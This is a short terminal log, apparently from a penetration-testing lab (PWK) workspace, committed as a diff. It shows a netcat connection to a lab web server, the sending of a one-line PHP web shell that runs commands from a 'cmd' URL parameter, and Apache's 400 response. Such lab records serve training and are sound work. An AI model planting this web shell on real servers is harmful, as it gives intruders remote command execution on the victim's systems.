@@ -1,0 +1,21 @@
+kali@kali:~/gitWorkspace/pwk/outputFiles/active_gathering/10.11.1.116$ nc -nv 10.11.1.116 80
+(UNKNOWN) [10.11.1.116] 80 (http) open
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+HTTP/1.1 400 Bad Request
+Date: Fri, 14 Aug 2020 03:09:36 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 309
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+<hr>
+<address>Apache/2.4.18 (Ubuntu) Server at dotty.thinc.local Port 80</address>
+</body></html>
+
